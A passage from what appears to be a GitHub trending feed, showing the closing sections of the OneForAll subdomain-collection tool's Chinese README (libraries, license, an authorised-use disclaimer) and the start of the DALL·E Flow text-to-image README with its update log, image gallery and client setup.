href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/&#34;&gt;docs&lt;/a&gt;目录下还提供了一些帮助与说明，如&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/dictionary_source.md&#34;&gt;子域字典来源说明&lt;/a&gt;、&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/wildcard_judgment.png&#34;&gt;泛解析判断流程&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h2&gt;👏用到框架&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/aio-libs/aiohttp&#34;&gt;aiohttp&lt;/a&gt; - 异步http客户端/服务器框架&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/beautifulsoup4/&#34;&gt;beautifulsoup4&lt;/a&gt; - 可以轻松从HTML或XML文件中提取数据的Python库&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/google/python-fire&#34;&gt;fire&lt;/a&gt; - Python Fire是一个纯粹根据任何Python对象自动生成命令行界面（CLI）的库&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Delgan/loguru&#34;&gt;loguru&lt;/a&gt; - 旨在带来愉快的日志记录Python库&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blechschmidt/massdns&#34;&gt;massdns&lt;/a&gt; - 高性能的DNS解析器&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kennethreitz/records&#34;&gt;records&lt;/a&gt; - Records是一个非常简单但功能强大的库，用于对大多数关系数据库进行最原始SQL查询。&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/psf/requests&#34;&gt;requests&lt;/a&gt; - Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用。&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tqdm/tqdm&#34;&gt;tqdm&lt;/a&gt; - 适用于Python和CLI的快速，可扩展的进度条库&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;感谢这些伟大优秀的Python库！&lt;/p&gt; &#xA;&lt;h2&gt;🔖版本控制&lt;/h2&gt; &#xA;&lt;p&gt;该项目使用&lt;a href=&#34;https://semver.org/&#34;&gt;SemVer&lt;/a&gt;语言化版本格式进行版本管理，你可以参阅&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/changes.md&#34;&gt;变更记录说明&lt;/a&gt;了解历史变更情况。&lt;/p&gt; &#xA;&lt;h2&gt;⌛后续计划&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 各模块持续优化和完善&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 操作强大交互人性的前端界面实现&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;更多信息请参阅&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/todo.md&#34;&gt;后续开发计划&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h2&gt;🙏贡献&lt;/h2&gt; &#xA;&lt;p&gt;非常热烈欢迎各位大佬一起完善本项目！&lt;/p&gt; &#xA;&lt;h2&gt;👨‍💻贡献者&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/shmilylty&#34;&gt;Jing Ling&lt;/a&gt;&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;核心开发&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;你可以在&lt;a href=&#34;https://github.com/shmilylty/OneForAll/tree/master/docs/contributors.md&#34;&gt;贡献者文档&lt;/a&gt;中查看所有贡献者以及他们所做出的贡献，感谢他们让OneForAll变得更强大好用。&lt;/p&gt; &#xA;&lt;h2&gt;☕赞赏&lt;/h2&gt; &#xA;&lt;p&gt;如果你觉得这个项目帮助到了你，你可以打赏一杯咖啡以资鼓励:)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shmilylty/OneForAll/master/images/Donate.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;📄版权&lt;/h2&gt; &#xA;&lt;p&gt;该项目签署了GPL-3.0授权许可，详情请参阅&lt;a href=&#34;https://github.com/shmilylty/OneForAll/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h2&gt;😘鸣谢&lt;/h2&gt; &#xA;&lt;p&gt;感谢网上开源的各个子域收集项目！&lt;/p&gt; &#xA;&lt;p&gt;感谢&lt;a href=&#34;https://github.com/QAX-A-Team&#34;&gt;A-Team&lt;/a&gt;大哥们热情无私的问题解答！&lt;/p&gt; &#xA;&lt;h2&gt;📜免责声明&lt;/h2&gt; &#xA;&lt;p&gt;本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。&lt;/p&gt; &#xA;&lt;h2&gt;💖Star趋势&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/shmilylty/OneForAll&#34;&gt;&lt;img src=&#34;https://starchart.cc/shmilylty/OneForAll.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>jina-ai/dalle-flow</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/jina-ai/dalle-flow</id>
    <link href="https://github.com/jina-ai/dalle-flow" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A Human-in-the-Loop workflow for creating HD images from text&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/banner.svg?raw=true&#34; alt=&#34;DALL·E Flow: A Human-in-the-Loop workflow for creating HD images from text&#34; width=&#34;60%&#34;&gt; &lt;br&gt; &lt;b&gt;A Human-in-the-Loop&lt;sup&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Human-in-the-loop&#34;&gt;?&lt;/a&gt;&lt;/sup&gt; workflow for creating HD images from text&lt;/b&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://slack.jina.ai&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Slack-2.8k-blueviolet?logo=slack&amp;amp;logoColor=white&amp;amp;style=flat-square&#34; alt=&#34;Open in Google Colab&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Open-in%20Colab-orange?logo=google-colab&amp;amp;style=flat-square&#34; alt=&#34;Open in Google Colab&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;DALL·E Flow is an interactive workflow for generating high-definition images from text prompt. First, it leverages &lt;a href=&#34;https://github.com/borisdayma/dalle-mini&#34;&gt;DALL·E-Mega&lt;/a&gt; to generate image candidates, and then calls &lt;a href=&#34;https://github.com/jina-ai/clip-as-service&#34;&gt;CLIP-as-service&lt;/a&gt; to rank the candidates w.r.t. the prompt. The preferred candidate is fed to &lt;a href=&#34;https://github.com/Jack000/glid-3-xl&#34;&gt;GLID-3 XL&lt;/a&gt; for diffusion, which often enriches the texture and background. Finally, the candidate is upscaled to 1024x1024 via &lt;a href=&#34;https://github.com/JingyunLiang/SwinIR&#34;&gt;SwinIR&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;DALL·E Flow is built with &lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;Jina&lt;/a&gt; in a client-server architecture, which gives it high scalability, non-blocking streaming, and a modern Pythonic interface. Client can interact with the server via gRPC/Websocket/HTTP with TLS.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Why Human-in-the-Loop?&lt;/strong&gt; Generative art is a creative process. While recent advances of DALL·E unleash people&#39;s creativity, having a single-prompt-single-output UX/UI locks the imagination to a &lt;em&gt;single&lt;/em&gt; possibility, which is bad no matter how fine this single result is. DALL·E Flow is an alternative to the one-liner, by formalizing the generative art as an iterative procedure.&lt;/p&gt; &#xA;&lt;h2&gt;Updates&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;⚠️ &lt;strong&gt;2022/5/23&lt;/strong&gt; Fix an upstream bug in CLIP-as-service. This bug makes the 2nd diffusion step irrelevant to the given texts. New Dockerfile proved to be reproducible on a AWS EC2 &lt;code&gt;p2.x8large&lt;/code&gt; instance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;2022/5/13b&lt;/strong&gt; Removing TLS as Cloudflare gives 100s timeout, making DALLE Flow in usable &lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;Please &lt;em&gt;reopen&lt;/em&gt; the notebook in Google Colab!&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;🔐 &lt;strong&gt;2022/5/13&lt;/strong&gt; New Mega checkpoint! All connections are now with TLS, &lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;Please &lt;em&gt;reopen&lt;/em&gt; the notebook in Google Colab!&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;🐳 &lt;strong&gt;2022/5/10&lt;/strong&gt; &lt;a href=&#34;https://raw.githubusercontent.com/jina-ai/dalle-flow/main/#run-in-docker&#34;&gt;A Dockerfile is added! Now you can easily deploy your own DALL·E Flow&lt;/a&gt;. New Mega checkpoint! Smaller memory-footprint, the whole Flow can now fit into &lt;strong&gt;one GPU with 21GB memory&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;🌟 &lt;strong&gt;2022/5/7&lt;/strong&gt; New Mega checkpoint &amp;amp; multiple optimization on GLID3: less memory-footprint, use &lt;code&gt;ViT-L/14@336px&lt;/code&gt; from CLIP-as-service, &lt;code&gt;steps 100-&amp;gt;200&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;🌟 &lt;strong&gt;2022/5/6&lt;/strong&gt; DALL·E Flow just got updated! &lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;Please &lt;em&gt;reopen&lt;/em&gt; the notebook in Google Colab!&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Revised the first step: 16 candidates are generated, 8 from DALL·E Mega, 8 from GLID3-XL; then ranked by CLIP-as-service.&lt;/li&gt; &#xA;   &lt;li&gt;Improved the flow efficiency: the overall speed, including diffusion and upscaling are much faster now!&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Gallery&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20realistic%20photo%20of%20a%20muddy%20dog.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a realistic photo of a muddy dog&#34; title=&#34;a realistic photo of a muddy dog&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20scientist%20comparing%20apples%20and%20oranges%2C%20by%20Norman%20Rockwell.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A scientist comparing apples and oranges, by Norman Rockwell&#34; title=&#34;A scientist comparing apples and oranges, by Norman Rockwell&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20portrait%20of%20the%20regal%20Burger%20King%20posing%20with%20a%20Whopper.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting portrait of the regal Burger King posing with a Whopper&#34; title=&#34;an oil painting portrait of the regal Burger King posing with a Whopper&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/Eternal%20clock%20powered%20by%20a%20human%20cranium%2C%20artstation.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;Eternal clock powered by a human cranium, artstation&#34; title=&#34;Eternal clock powered by a human cranium, artstation&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/another%20planet%20amazing%20landscape.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;another planet amazing landscape&#34; title=&#34;another planet amazing landscape&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/The%20Decline%20and%20Fall%20of%20the%20Roman%20Empire%20board%20game%20kickstarter.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;The Decline and Fall of the Roman Empire board game kickstarter&#34; title=&#34;The Decline and Fall of the Roman Empire board game kickstarter&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20raccoon%20astronaut%20with%20the%20cosmos%20reflecting%20on%20the%20glass%20of%20his%20helmet%20dreaming%20of%20the%20stars%2C%20digital%20art.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A raccoon astronaut with the cosmos reflecting on the glass of his helmet dreaming of the stars, digital art&#34; title=&#34;A raccoon astronaut with the cosmos reflecting on the glass of his helmet dreaming of the stars, digital art&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20photograph%20of%20an%20apple%20that%20is%20a%20disco%20ball%2C%2085%20mm%20lens%2C%20studio%20lighting.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A photograph of an apple that is a disco ball, 85 mm lens, studio lighting&#34; title=&#34;A photograph of an apple that is a disco ball, 85 mm lens, studio lighting&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20cubism%20painting%20Donald%20trump%20happy%20cyberpunk.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a cubism painting Donald trump happy cyberpunk&#34; title=&#34;a cubism painting Donald trump happy cyberpunk&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/oil%20painting%20of%20a%20hamster%20drinking%20tea%20outside.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;oil painting of a hamster drinking tea outside&#34; title=&#34;oil painting of a hamster drinking tea outside&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/Colossus%20of%20Rhodes%20by%20Max%20Ernst.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;Colossus of Rhodes by Max Ernst&#34; title=&#34;Colossus of Rhodes by Max Ernst&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/landscape%20with%20great%20castle%20in%20middle%20of%20forest.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;landscape with great castle in middle of forest&#34; title=&#34;landscape with great castle in middle of forest&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20medieval%20oil%20painting%20of%20Kanye%20west%20feels%20satisfied%20while%20playing%20chess%20in%20the%20style%20of%20Expressionism.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an medieval oil painting of Kanye west feels satisfied while playing chess in the style of Expressionism&#34; title=&#34;an medieval oil painting of Kanye west feels satisfied while playing chess in the style of Expressionism&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/An%20oil%20pastel%20painting%20of%20an%20annoyed%20cat%20in%20a%20spaceship.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;An oil pastel painting of an annoyed cat in a spaceship&#34; title=&#34;An oil pastel painting of an annoyed cat in a spaceship&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/dinosaurs%20at%20the%20brink%20of%20a%20nuclear%20disaster.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;dinosaurs at the brink of a nuclear disaster&#34; title=&#34;dinosaurs at the brink of a nuclear disaster&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/fantasy%20landscape%20with%20medieval%20city.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;fantasy landscape with medieval city&#34; title=&#34;fantasy landscape with medieval city&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/GPU%20chip%20in%20the%20form%20of%20an%20avocado%2C%20digital%20art.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;GPU chip in the form of an avocado, digital art&#34; title=&#34;GPU chip in the form of an avocado, digital art&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20giant%20rubber%20duck%20in%20the%20ocean.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a giant rubber duck in the ocean&#34; title=&#34;a giant rubber duck in the ocean&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/Paddington%20bear%20as%20austrian%20emperor%20in%20antique%20black%20%26%20white%20photography.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;Paddington bear as austrian emperor in antique black &amp;amp; white photography&#34; title=&#34;Paddington bear as austrian emperor in antique black &amp;amp; white photography&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20rainy%20night%20with%20a%20superhero%20perched%20above%20a%20city%2C%20in%20the%20style%20of%20a%20comic%20book.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a rainy night with a superhero perched above a city, in the style of a comic book&#34; title=&#34;a rainy night with a superhero perched above a city, in the style of a comic book&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20synthwave%20style%20sunset%20above%20the%20reflecting%20water%20of%20the%20sea%2C%20digital%20art.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A synthwave style sunset above the reflecting water of the sea, digital art&#34; title=&#34;A synthwave style sunset above the reflecting water of the sea, digital art&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20of%20ocean%20beach%20front%20in%20the%20style%20of%20Titian.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting of ocean beach front in the style of Titian&#34; title=&#34;an oil painting of ocean beach front in the style of Titian&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20of%20Klingon%20general%20in%20the%20style%20of%20Rubens.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting of Klingon general in the style of Rubens&#34; title=&#34;an oil painting of Klingon general in the style of Rubens&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/city%2C%20top%20view%2C%20cyberpunk%2C%20digital%20realistic%20art.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;city, top view, cyberpunk, digital realistic art&#34; title=&#34;city, top view, cyberpunk, digital realistic art&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20of%20a%20medieval%20cyborg%20automaton%20made%20of%20magic%20parts%20and%20old%20steampunk%20mechanics.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting of a medieval cyborg automaton made of magic parts and old steampunk mechanics&#34; title=&#34;an oil painting of a medieval cyborg automaton made of magic parts and old steampunk mechanics&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20watercolour%20painting%20of%20a%20top%20view%20of%20a%20pirate%20ship%20sailing%20on%20the%20clouds.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a watercolour painting of a top view of a pirate ship sailing on the clouds&#34; title=&#34;a watercolour painting of a top view of a pirate ship sailing on the clouds&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20knight%20made%20of%20beautiful%20flowers%20and%20fruits%20by%20Rachel%20ruysch%20in%20the%20style%20of%20Syd%20brak.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a knight made of beautiful flowers and fruits by Rachel ruysch in the style of Syd brak&#34; title=&#34;a knight made of beautiful flowers and fruits by Rachel ruysch in the style of Syd brak&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%203D%20render%20of%20a%20rainbow%20colored%20hot%20air%20balloon%20flying%20above%20a%20reflective%20lake.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a 3D render of a rainbow colored hot air balloon flying above a reflective lake&#34; title=&#34;a 3D render of a rainbow colored hot air balloon flying above a reflective lake&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20teddy%20bear%20on%20a%20skateboard%20in%20Times%20Square%20.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a teddy bear on a skateboard in Times Square &#34; title=&#34;a teddy bear on a skateboard in Times Square &#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/cozy%20bedroom%20at%20night.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;cozy bedroom at night&#34; title=&#34;cozy bedroom at night&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20of%20monkey%20using%20computer.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting of monkey using computer&#34; title=&#34;an oil painting of monkey using computer&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/the%20diagram%20of%20a%20search%20machine%20invented%20by%20Leonardo%20da%20Vinci.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;the diagram of a search machine invented by Leonardo da Vinci&#34; title=&#34;the diagram of a search machine invented by Leonardo da Vinci&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20stained%20glass%20window%20of%20toucans%20in%20outer%20space.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A stained glass window of toucans in outer space&#34; title=&#34;A stained glass window of toucans in outer space&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20campfire%20in%20the%20woods%20at%20night%20with%20the%20milky-way%20galaxy%20in%20the%20sky.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a campfire in the woods at night with the milky-way galaxy in the sky&#34; title=&#34;a campfire in the woods at night with the milky-way galaxy in the sky&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/Bionic%20killer%20robot%20made%20of%20AI%20scarab%20beetles.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;Bionic killer robot made of AI scarab beetles&#34; title=&#34;Bionic killer robot made of AI scarab beetles&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/The%20Hanging%20Gardens%20of%20Babylon%20in%20the%20middle%20of%20a%20city%2C%20in%20the%20style%20of%20Dal%C3%AD.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;The Hanging Gardens of Babylon in the middle of a city, in the style of Dalí&#34; title=&#34;The Hanging Gardens of Babylon in the middle of a city, in the style of Dalí&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/painting%20oil%20of%20Izhevsk.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;painting oil of Izhevsk&#34; title=&#34;painting oil of Izhevsk&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20hyper%20realistic%20photo%20of%20a%20marshmallow%20office%20chair.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a hyper realistic photo of a marshmallow office chair&#34; title=&#34;a hyper realistic photo of a marshmallow office chair&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/fantasy%20landscape%20with%20city.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;fantasy landscape with city&#34; title=&#34;fantasy landscape with city&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/ocean%20beach%20front%20view%20in%20Van%20Gogh%20style.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;ocean beach front view in Van Gogh style&#34; title=&#34;ocean beach front view in Van Gogh style&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/An%20oil%20painting%20of%20a%20family%20reunited%20inside%20of%20an%20airport%2C%20digital%20art.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;An oil painting of a family reunited inside of an airport, digital art&#34; title=&#34;An oil painting of a family reunited inside of an airport, digital art&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/antique%20photo%20of%20a%20knight%20riding%20a%20T-Rex.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;antique photo of a knight riding a T-Rex&#34; title=&#34;antique photo of a knight riding a T-Rex&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20top%20view%20of%20a%20pirate%20ship%20sailing%20on%20the%20clouds.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a top view of a pirate ship sailing on the clouds&#34; title=&#34;a top view of a pirate ship sailing on the clouds&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/an%20oil%20painting%20of%20a%20humanoid%20robot%20playing%20chess%20in%20the%20style%20of%20Matisse.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;an oil painting of a humanoid robot playing chess in the style of Matisse&#34; title=&#34;an oil painting of a humanoid robot playing chess in the style of Matisse&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20cubism%20painting%20of%20a%20cat%20dressed%20as%20French%20emperor%20Napoleon.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a cubism painting of a cat dressed as French emperor Napoleon&#34; title=&#34;a cubism painting of a cat dressed as French emperor Napoleon&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/a%20husky%20dog%20wearing%20a%20hat%20with%20sunglasses.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;a husky dog wearing a hat with sunglasses&#34; title=&#34;a husky dog wearing a hat with sunglasses&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/A%20mystical%20castle%20appears%20between%20the%20clouds%20in%20the%20style%20of%20Vincent%20di%20Fate.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;A mystical castle appears between the clouds in the style of Vincent di Fate&#34; title=&#34;A mystical castle appears between the clouds in the style of Vincent di Fate&#34;&gt;&lt;img src=&#34;https://github.com/hanxiao/dalle/raw/gallery/.github/gallery/golden%20gucci%20airpods%20realistic%20photo.png?raw=true&#34; width=&#34;32%&#34; alt=&#34;golden gucci airpods realistic photo&#34; title=&#34;golden gucci airpods realistic photo&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Client&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Open-in%20Colab-orange?logo=google-colab&amp;amp;style=flat-square&#34; alt=&#34;Open in Google Colab&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Using client is super easy. The following steps are best run in &lt;a href=&#34;https://raw.githubusercontent.com/jina-ai/dalle-flow/main/client.ipynb&#34;&gt;Jupyter notebook&lt;/a&gt; or &lt;a href=&#34;https://colab.research.google.com/github/jina-ai/dalle-flow/blob/main/client.ipynb&#34;&gt;Google Colab&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You will need to install &lt;a href=&#34;https://github.com/jina-ai/docarray&#34;&gt;DocArray&lt;/a&gt; and &lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;Jina&lt;/a&gt; first:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install &#34;docarray[common]&amp;gt;=0.13.5&#34; jina&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We have provided a demo server for you to play:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠️ &lt;strong&gt;Due to the massive requests, our server may be delay in response. Yet we are &lt;em&gt;very&lt;/em&gt; confident on keeping the uptime high.&lt;/strong&gt; You can also deploy your own server by &lt;a href=&#34;https://raw.githubusercontent.com/jina-ai/dalle-flow/main/#server&#34;&gt;following the instruction here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;server_url = &#39;grpc://dalle-flow.jina.ai:51005&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Step 1: Generate via DALL·E Mega&lt;/h3&gt; &#xA;&lt;p&gt;Now let&#39;s define the prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;prompt = &#39;an oil painting of a humanoid robot playing chess in the style of 